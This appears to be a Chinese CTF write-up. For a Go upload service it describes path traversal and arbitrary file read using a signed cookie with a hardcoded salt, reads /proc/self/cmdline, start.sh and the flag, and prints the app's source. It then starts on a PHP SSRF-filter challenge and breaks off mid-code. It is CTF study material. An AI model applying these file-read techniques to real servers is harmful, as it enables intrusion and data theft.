<p>测试上传文件接口发现，可以直接路径穿越</p>
<p>测试查看上传文件接口发现，可以任意文件读取，但是你得有cookie(通过文件上传生成)</p>
<p>/proc/self/cmdline</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HOSTNAME=engine-1 HOME=/root OLDPWD=/root TERM=xterm PATH=/go/bin:/usr/local/go/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin GOPATH=/go PWD=/go GOLANG_VERSION=1.15.5</span><br></pre></td></tr></table></figure>





<p>刚开始去读/etc/passwd发现，啥都没有，但是读/proc/self/cmdline就有东西，然后猜测了下这是root权限启动的</p>
<p>由于重启docker环境并不是让cookie的salt发生改变，所以，如果用之前生成好的cookie(如果是root权限/etc/passwd被覆盖)去获得新docker的/etc/passwd有内容的话就说明是root权限，没有的话就是其他原因</p>
<p>。。。。。</p>
<p>真的是root权限！！！！！</p>
<p>直接读取/root/start.sh</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">flagfile=/flag</span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$&#123;ICQ_FLAG&#125;</span> ];<span class="keyword">then</span></span><br><span class="line">    <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$flagfile</span>&quot;</span>x = <span class="string">&quot;/flagx&quot;</span> ];<span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$&#123;ICQ_FLAG&#125;</span> &gt; <span class="variable">$&#123;flagfile&#125;</span></span><br><span class="line">        chmod 755 <span class="variable">$&#123;flagfile&#125;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="comment">#sed -i &quot;s/flag&#123;x*&#125;/$&#123;ICQ_FLAG&#125;/&quot; $flagfile</span></span><br><span class="line">        sed -i -r <span class="string">&quot;s/flag\&#123;.*\&#125;/<span class="variable">$&#123;ICQ_FLAG&#125;</span>/&quot;</span> <span class="variable">$flagfile</span></span><br><span class="line">        <span class="comment">#mysql -uroot -proot nXXXX &lt; $flagfile</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    <span class="built_in">echo</span> [+] sed flag OK</span><br><span class="line">    <span class="built_in">unset</span> ICQ_FLAG</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> [!] no ICQ_FLAG</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">service cron start&amp;&amp;whoami&amp;&amp;<span class="built_in">cd</span> /go&amp;&amp;go run src/main.go src/functions.go src/model.go src/routes.go</span><br></pre></td></tr></table></figure>

<p>再去读取/flag，顺便读了下源码：</p>
<p>main.go</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;log&quot;</span></span><br><span class="line">    <span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    http.Handle(<span class="string">&quot;/uploads/&quot;</span>, http.StripPrefix(<span class="string">&quot;/uploads/&quot;</span>, http.FileServer(http.Dir(<span class="string">&quot;uploads/&quot;</span>))))</span><br><span class="line">    http.Handle(<span class="string">&quot;/statics/&quot;</span>, http.StripPrefix(<span class="string">&quot;/statics/&quot;</span>, http.FileServer(http.Dir(<span class="string">&quot;statics/&quot;</span>))))</span><br><span class="line">    http.HandleFunc(<span class="string">&quot;/index&quot;</span>, index)</span><br><span class="line">    http.HandleFunc(<span class="string">&quot;/&quot;</span>, index)</span><br><span class="line">    http.HandleFunc(<span class="string">&quot;/login&quot;</span>, login)</span><br><span class="line">    http.HandleFunc(<span class="string">&quot;/upload&quot;</span>, upload)</span><br><span class="line">    http.HandleFunc(<span class="string">&quot;/show&quot;</span>, show)</span><br><span class="line">    http.HandleFunc(<span class="string">&quot;/home&quot;</span>, home)</span><br><span class="line">    err := http.ListenAndServe(<span class="string">&quot;:80&quot;</span>, <span class="literal">nil</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Fatal(<span class="string">&quot;ListenAndServe: &quot;</span>, err)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>src/functions.go</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;bytes&quot;</span></span><br><span class="line">	<span class="string">&quot;crypto/md5&quot;</span></span><br><span class="line">	<span class="string">&quot;encoding/base64&quot;</span></span><br><span class="line">	<span class="string">&quot;encoding/gob&quot;</span></span><br><span class="line">	<span class="string">&quot;encoding/hex&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">PathExists</span><span class="params">(path <span class="keyword">string</span>)</span> <span class="params">(<span class="keyword">bool</span>, error)</span></span> &#123;</span><br><span class="line">	_, err := os.Stat(path)</span><br><span class="line">	<span class="keyword">if</span> err == <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>, <span class="literal">nil</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> os.IsNotExist(err) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>, <span class="literal">nil</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">fileExist</span><span class="params">(filename <span class="keyword">string</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">	_, err := os.Stat(filename)</span><br><span class="line">	<span class="keyword">return</span> err == <span class="literal">nil</span> || os.IsExist(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Md5</span><span class="params">(s <span class="keyword">string</span>)</span> <span class="title">string</span></span> &#123;</span><br><span class="line">	h := md5.New()</span><br><span class="line">	h.Write([]<span class="keyword">byte</span>(s))</span><br><span class="line">	<span class="keyword">return</span> hex.EncodeToString(h.Sum(<span class="literal">nil</span>))</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getCookie</span><span class="params">(r *http.Request)</span> <span class="title">interface</span></span>&#123;&#125;&#123;</span><br><span class="line">	cookie, err := r.Cookie(<span class="string">&quot;cookie&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err==<span class="literal">nil</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> cookie.Value</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">setCookie</span><span class="params">(w http.ResponseWriter,r *http.Request,value <span class="keyword">string</span>)</span></span>&#123;</span><br><span class="line">	expiration := time.Now()</span><br><span class="line">	expiration = expiration.AddDate(<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"><span class="comment">//	fmt.Println(value)</span></span><br><span class="line">	cookie := http.Cookie&#123;Name: <span class="string">&quot;cookie&quot;</span>, Value: value, Expires: expiration&#125;</span><br><span class="line">	http.SetCookie(w, &amp;cookie)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">serialize</span><span class="params">(instance Users)</span> []<span class="title">byte</span></span>&#123;</span><br><span class="line"><span class="comment">//	fmt.Println(instance.Username)</span></span><br><span class="line">	<span class="keyword">var</span> result bytes.Buffer</span><br><span class="line">	encoder := gob.NewEncoder(&amp;result)</span><br><span class="line">	encoder.Encode(instance)</span><br><span class="line">	userBytes := result.Bytes()</span><br><span class="line"><span class="comment">//	fmt.Printf(&quot;%s&quot;,userBytes)</span></span><br><span class="line">	<span class="keyword">return</span> userBytes</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">unseralize</span><span class="params">(data []<span class="keyword">byte</span>)</span> <span class="title">Users</span></span>&#123;</span><br><span class="line">	<span class="keyword">var</span> account Users</span><br><span class="line">	decoder := gob.NewDecoder(bytes.NewReader(data))</span><br><span class="line">	decoder.Decode(&amp;account)</span><br><span class="line">	<span class="keyword">return</span> account</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">cookieEncode</span><span class="params">(data []<span class="keyword">byte</span>)</span> <span class="title">string</span></span>&#123;</span><br><span class="line"><span class="comment">//    fmt.Printf(&quot;%s&quot;,data)</span></span><br><span class="line">	<span class="keyword">return</span> base64.StdEncoding.EncodeToString(data)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">cookieDecode</span><span class="params">(data <span class="keyword">string</span>)</span> []<span class="title">byte</span></span>&#123;</span><br><span class="line">	bytesData, _ := base64.StdEncoding.DecodeString(data)</span><br><span class="line">	<span class="keyword">return</span> bytesData</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>src/model.go</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Users <span class="keyword">struct</span>&#123;</span><br><span class="line">	Username <span class="keyword">string</span></span><br><span class="line">	Password <span class="keyword">string</span></span><br><span class="line">	Filename <span class="keyword">string</span></span><br><span class="line">	Sign <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> salt=<span class="string">&quot;123123adsdasr123sdfkaadls&quot;</span></span><br></pre></td></tr></table></figure>

<p>src/routes.go</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;encoding/base64&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;html/template&quot;</span></span><br><span class="line">	<span class="string">&quot;io&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">	<span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="comment">//Route:upload</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">upload</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">	r.Body = http.MaxBytesReader(w, r.Body, <span class="number">32</span>&lt;&lt;<span class="number">16</span>)</span><br><span class="line">	ip := strings.Split(r.RemoteAddr, <span class="string">&quot;:&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">	<span class="keyword">if</span> getCookie(r)!=<span class="literal">nil</span>&#123;</span><br><span class="line">		UserData:=unseralize(cookieDecode(getCookie(r).(<span class="keyword">string</span>)))</span><br><span class="line">		<span class="keyword">if</span> r.Method == <span class="string">&quot;GET&quot;</span> &#123;</span><br><span class="line">			t, _ := template.ParseFiles(<span class="string">&quot;upload.gtpl&quot;</span>)</span><br><span class="line">			t.Execute(w,<span class="literal">nil</span>)</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			path:=<span class="string">&quot;./uploads/&quot;</span>+Md5(ip)</span><br><span class="line">			tmp,_:=PathExists(path)</span><br><span class="line">			<span class="keyword">if</span> !tmp&#123;</span><br><span class="line">				err:= os.Mkdir(path, os.ModePerm)</span><br><span class="line">				<span class="keyword">if</span> err!=<span class="literal">nil</span>&#123;</span><br><span class="line">					fmt.Printf(<span class="string">&quot;failed&quot;</span>)</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			r.ParseMultipartForm(<span class="number">32</span> &lt;&lt; <span class="number">20</span>)</span><br><span class="line">			file, handler, err := r.FormFile(<span class="string">&quot;uploadfile&quot;</span>)</span><br><span class="line">			<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">				fmt.Println(err)</span><br><span class="line">				<span class="keyword">return</span></span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">defer</span> file.Close()</span><br><span class="line">			f, err := os.OpenFile(<span class="string">&quot;./uploads/&quot;</span>+Md5(ip)+<span class="string">&quot;/&quot;</span>+handler.Filename, os.O_WRONLY|os.O_TRUNC|os.O_CREATE, <span class="number">0777</span>)</span><br><span class="line">			<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">				fmt.Fprint(w,err)</span><br><span class="line">				<span class="keyword">return</span></span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">defer</span> f.Close()</span><br><span class="line">			io.Copy(f, file)</span><br><span class="line">			UserData.Filename=<span class="string">&quot;./uploads/&quot;</span>+Md5(ip)+<span class="string">&quot;/&quot;</span>+handler.Filename</span><br><span class="line">			UserData.Sign=Md5(UserData.Filename+salt)</span><br><span class="line">			setCookie(w,r,cookieEncode((serialize(UserData))))</span><br><span class="line">			fmt.Fprint(w,UserData)</span><br><span class="line">			fmt.Fprint(w,<span class="string">&quot;上传成功：&quot;</span>+handler.Filename)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		fmt.Fprint(w,<span class="string">&quot;&lt;script&gt;alert(&#x27;Login first my baby&#x27;);&lt;/script&gt;&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Route:/index || /</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">index</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">	t, _ := template.ParseFiles(<span class="string">&quot;index.gtpl&quot;</span>)</span><br><span class="line">	t.Execute(w,<span class="literal">nil</span>)</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Route:/login</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">login</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> r.Method==<span class="string">&quot;POST&quot;</span>&#123;</span><br><span class="line">		r.ParseForm()</span><br><span class="line">		<span class="keyword">if</span> r.Form[<span class="string">&quot;username&quot;</span>]==<span class="literal">nil</span> &amp;&amp; r.Form[<span class="string">&quot;password&quot;</span>]==<span class="literal">nil</span>&#123;</span><br><span class="line">			fmt.Fprint(w,<span class="string">&quot;username and password is required&quot;</span>)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		User:=Users&#123;</span><br><span class="line">			Username: r.Form[<span class="string">&quot;username&quot;</span>][<span class="number">0</span>],</span><br><span class="line">			Password: r.Form[<span class="string">&quot;password&quot;</span>][<span class="number">0</span>],</span><br><span class="line">		&#125;</span><br><span class="line">        setCookie(w,r,cookieEncode(serialize(User)))</span><br><span class="line">		fmt.Fprint(w,<span class="string">&quot;&lt;script&gt;window.location.href=&#x27;/home&#x27;&lt;/script&gt;&quot;</span>)</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		fmt.Fprint(w,<span class="string">&quot;Method not allowed&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">home</span><span class="params">(w http.ResponseWriter,r *http.Request)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> getCookie(r)!=<span class="literal">nil</span> &#123;</span><br><span class="line">		t, _ := template.ParseFiles(<span class="string">&quot;home.gtpl&quot;</span>)</span><br><span class="line">		t.Execute(w, <span class="literal">nil</span>)</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		fmt.Fprint(w,<span class="string">&quot;&lt;script&gt;alert(&#x27;Login first my baby&#x27;);&lt;/script&gt;&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Route:/show</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">show</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> getCookie(r)!=<span class="literal">nil</span> &#123;</span><br><span class="line">		UserData:=unseralize(cookieDecode(getCookie(r).(<span class="keyword">string</span>)))</span><br><span class="line">		file:=UserData.Filename</span><br><span class="line">		sign:=UserData.Sign</span><br><span class="line">		ff, err := os.Open(file)</span><br><span class="line">		<span class="keyword">defer</span> ff.Close()</span><br><span class="line">		<span class="keyword">if</span> err!=<span class="literal">nil</span>&#123;</span><br><span class="line">			fmt.Println(err)</span><br><span class="line">			t, _ := template.ParseFiles(<span class="string">&quot;show.gtpl&quot;</span>)</span><br><span class="line">			t.Execute(w, template.HTML(<span class="string">&quot;？？？？？&quot;</span>))</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		fmt.Println(sign)</span><br><span class="line">		<span class="keyword">if</span> sign!=Md5(file+salt)&#123;</span><br><span class="line">			fmt.Fprint(w,<span class="string">&quot;签名失败&quot;</span>)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		sourcebuffer := <span class="built_in">make</span>([]<span class="keyword">byte</span>, <span class="number">500000</span>)</span><br><span class="line">		n, _ := ff.Read(sourcebuffer)</span><br><span class="line">		filedata := base64.StdEncoding.EncodeToString(sourcebuffer[:n])</span><br><span class="line">		fmt.Println(filedata)</span><br><span class="line">		t, _ := template.ParseFiles(<span class="string">&quot;show.gtpl&quot;</span>)</span><br><span class="line">		t.Execute(w, template.HTML(<span class="string">&quot;&lt;img src=&#x27;data:image/jpeg;base64,&quot;</span>+filedata+<span class="string">&quot;&#x27;&gt;&quot;</span>))</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		fmt.Fprint(w,<span class="string">&quot;&lt;script&gt;alert(&#x27;Login first my baby&#x27;);&lt;/script&gt;&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>这样应该是非预期把？</p>
<h2 id="doyouknowssrf"><a href="#doyouknowssrf" class="headerlink" title="doyouknowssrf"></a>doyouknowssrf</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// ini_set(&quot;display_errors&quot;, &quot;On&quot;);</span></span><br><span class="line"><span class="comment">// error_reporting(E_ALL | E_STRICT);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_url</span>(<span class="params"><span class="variable">$url</span>,<span class="variable">$safe</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$parsed</span> = parse_url(<span class="variable">$url</span>);</span><br><span class="line">    <span class="variable">$validate_ip</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$parsed</span>[<span class="string">&#x27;port&#x27;</span>]  &amp;&amp; !in_array(<span class="variable">$parsed</span>[<span class="string">&#x27;port&#x27;</span>],<span class="keyword">array</span>(<span class="string">&#x27;80&#x27;</span>,<span class="string">&#x27;443&#x27;</span>)))&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;b&gt;请求错误:非正常端口,因安全问题只允许抓取80,443端口的链接,如有特殊需求请自行修改程序&lt;/b&gt;&quot;</span>.PHP_EOL;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        preg_match(<span class="string">&#x27;/^\d+$/&#x27;</span>, <span class="variable">$parsed</span>[<span class="string">&#x27;host&#x27;</span>]) &amp;&amp; <span class="variable">$parsed</span>[<span class="string">&#x27;host&#x27;</span>] = long2ip(<span class="variable">$parsed</span>[<span class="string">&#x27;host&#x27;</span>]);</span><br><span class="line">        <span class="variable">$long</span> = ip2long(<span class="variable">$parsed</span>[<span class="string">&#x27;host&#x27;</span>]);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$long</span>===<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="variable">$ip</span> = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$safe</span>)&#123;</span><br><span class="line">                @putenv(<span class="string">&#x27;RES_OPTIONS=retrans:1 retry:1 timeout:1 attempts:1&#x27;</span>);</span><br><span class="line">                <span class="variable">$ip</span>   = gethostbyname(<span class="variable">$parsed</span>[<span class="string">&#x27;host&#x27;</span>]);</span><br><span class="line">                <span class="variable">$long</span> = ip2long(<span class="variable">$ip</span>);</span><br><span class="line">                <span class="variable">$long</span>===<span class="literal">false</span> &amp;&amp; <span class="variable">$ip</span> = <span class="literal">null</span>;</span><br><span class="line">                @putenv(<span class="string">&#x27;RES_OPTIONS&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$ip</span> = <span class="variable">$parsed</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$ip</span> &amp;&amp; <span class="variable">$validate_ip</span> = filter_var(<span class="variable">$ip</span>, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!in_array(<span class="variable">$parsed</span>[<span class="string">&#x27;scheme&#x27;</span>],<span class="keyword">array</span>(<span class="string">&#x27;http&#x27;</span>,<span class="string">&#x27;https&#x27;</span>)) || !<span class="variable">$validate_ip</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;b&gt;<span class="subst">&#123;$url&#125;</span> 请求错误:非正常URL格式,因安全问题只允许抓取 http:// 或 https:// 开头的链接或公有IP地址&lt;/b&gt;&quot;</span>.PHP_EOL;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$url</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span 